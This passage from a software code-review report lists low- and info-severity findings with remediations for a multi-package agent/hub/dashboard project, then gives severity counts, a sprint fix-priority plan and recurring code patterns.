- **Remediation:** Add a message queue that flushes on reconnect, at least for recording uploads.

### LO-25: JSONC comment-stripping regex corrupts strings containing `//` (agent)
- **Severity:** Low
- **Pillar:** Robustness
- **File:** `packages/agent/src/devcontainer.ts:30`
- **Description:** Regex strips `//` inside JSON string values (e.g., image URLs). Wrong Docker image used.
- **Remediation:** Use `jsonc-parser` package or `strip-json-comments`.

### LO-26: `killAll()` fallback timer not cancelled on early session exit (agent)
- **Severity:** Low
- **Pillar:** Performance
- **File:** `packages/agent/src/pty-pool.ts:121`
- **Description:** 10s timeout not cleared when session exits normally. Daemon shutdown always takes 10s.
- **Remediation:** Store timer ref, clear in exit handler.

### LO-27: `ContainerPool.dispose()` awaits removes sequentially — slow teardown (agent)
- **Severity:** Low
- **Pillar:** Performance
- **File:** `packages/agent/src/container-pool.ts:236-243`
- **Description:** Sequential `await this.remove(id)` — 4 serial Docker API calls.
- **Impact:** Slow shutdown; SIGKILL before cleanup in K8s.
- **Remediation:** `await Promise.all(ids.map(id => this.remove(id)))`.

### LO-24: `Scrubber` regex patterns use global flag — `lastIndex` reset needed
- **Severity:** Low
- **Pillar:** Robustness
- **File:** `packages/agent/src/scrubber.ts:29-30`
- **Description:** `regex.lastIndex = 0` is correctly called before each use. However, if the scrubber is used concurrently (e.g., multiple sessions), the shared regex state could produce incorrect results.
- **Impact:** Theoretical — current single-threaded Node.js usage is safe.
- **Remediation:** Create per-call RegExp instances or document single-thread assumption.

---

## Info

### IN-01: Port `7700` hardcoded for production detection in WebSocket composable
- **Severity:** Info
- **Pillar:** Maintainability
- **File:** `packages/dashboard/app/composables/useWebSocket.ts:49-52`

### IN-02: `NotificationFeed.vue` uses fragile `.includes()` string matching on notification type
- **Severity:** Info
- **Pillar:** Maintainability
- **File:** `packages/dashboard/app/components/notifications/NotificationFeed.vue:36-39`

### IN-03: `Dockerfile.hub` runs as root by default
- **Severity:** Info
- **Pillar:** Security
- **File:** `Dockerfile.hub:45-69`
- **Description:** No `USER` instruction in runtime stage. Container runs as root. Not critical for the Hub (no user-supplied code execution), but violates container security best practices.
- **Remediation:** Add `RUN adduser --disabled-password --no-create-home chq` and `USER chq`.

### IN-04: `createBody` in `jobRoutes` accepts `.branch` as optional string but it's used as git branch name
- **Severity:** Info
- **Pillar:** Security
- **File:** `packages/hub/src/routes/jobs.ts:62`
- **Description:** No validation that the string is a valid git branch name. Could contain spaces or special characters.
- **Remediation:** Add regex validation: `z.string().regex(/^[a-zA-Z0-9\/_.-]+$/)`.

### IN-05: PR body in `create-pr` contains hardcoded `localhost:3000` URL
- **Severity:** Info
- **Pillar:** Maintainability
- **File:** `packages/hub/src/routes/github.ts:168`
- **Description:** `_Created by [Claude HQ](http://localhost:3000/jobs/${job.id})_` — non-functional in production.
- **Remediation:** Use configurable base URL from `HubConfig`.

---

## Findings Summary

| Severity | Count | Packages Affected |
|----------|-------|-------------------|
| Critical | 1 | dashboard |
| High | 13 | shared, dashboard, agent |
| Medium | 39 | shared, hub, dashboard, agent |
| Low | 27 | shared, hub, dashboard, agent |
| Info | 5 | hub, dashboard |
| **Total** | **85** | |

### By Pillar

| Pillar | Count |
|--------|-------|
| Architecture & Design | 16 |
| Performance | 13 |
| Security & Data Handling | 16 |
| Maintainability & Readability | 5 |
| Robustness & Error Handling | 35 |

### By Package

| Package | Critical | High | Medium | Low | Info | Total |
|---------|----------|------|--------|-----|------|-------|
| shared | 0 | 3 | 6 | 12 | 0 | 21 |
| hub | 0 | 0 | 7 | 4 | 3 | 14 |
| dashboard | 1 | 5 | 17 | 6 | 2 | 31 |
| agent | 0 | 5 | 9 | 5 | 0 | 19 |

---

## Recommended Fix Priority

### Sprint N+1: Security-Critical + High (MUST FIX IMMEDIATELY)
1. **HI-11 + HI-12:** Shell injection in workspace-provisioner (`execSync` with interpolated paths, arbitrary `setupCommands`)
2. **HI-13:** SSH remote command injection (unquoted `cwd`)
3. **HI-09:** Unvalidated queue file deserialization
4. **HI-10:** Agent token exposed in WebSocket URL
5. **CR-01:** Fix double `res.json()` in NewSessionModal
6. **HI-01:** Add approval/workforce messages to discriminatedUnion schemas
7. **HI-02 + HI-03:** Fix shared package browser exports
8. **HI-04:** Fix replay terminal initialization
9. **HI-05:** Bind connection status to real WebSocket state
10. **HI-06 + HI-07:** Error handling for GitHub settings and MachineHealth
11. **HI-08:** Clear terminal on sessionId change

### Sprint N+2: Medium (fix before beta)
12. **ME-33 through ME-39:** Agent package (CPU normalization, memory leaks, non-atomic writes, container cleanup)
13. **ME-01 through ME-08:** Shared schema validation and completeness
14. **ME-09 through ME-13:** Hub performance (hoist db.prepare, fix type casts)
15. **ME-14 through ME-27:** Dashboard error handling (systematic: every page with direct fetch)
16. **ME-28 through ME-32:** Remaining medium issues

### Sprint N+3: Low + Info (fix before GA)
17. **LO-01 through LO-27:** Schema constraints, bundle optimization, agent cleanup, minor fixes
18. **IN-01 through IN-05:** Hardcoded values, container user, documentation

---

## Systemic Patterns Identified

### Pattern 1: Dashboard pages bypass stores for direct fetch without error handling
15 of the 31 dashboard findings stem from pages that call `fetch()` directly in `onMounted` without:
- `try/catch`
- `res.ok` check
- `error` ref
- `<v-alert>` with retry

**Recommendation:** Create a `useFetch` composable that wraps fetch with standard error handling and returns `{ data, loading, error, retry }`. Or enforce that all data fetching goes through Pinia stores which already handle the three states correctly.

### Pattern 2: Shared schemas lack numeric range constraints
12 findings are missing `.min()`, `.max()`, `.int()` on numeric Zod fields. These are not security-critical individually but collectively indicate that schema validation is focused on type correctness without semantic correctness.

**Recommendation:** Audit all `z.number()` usages in shared and add appropriate range constraints.

### Pattern 3: Hub still has inline `db.prepare()` in newer routes
The prior review fixed this in the original files, but routes added in later sprints (scheduled-tasks, approvals list, jobs list, notifications engine) reintroduced the anti-pattern.

**Recommendation:** Add an ESLint rule or code review checklist item: "No `db.prepare()` inside function bodies."
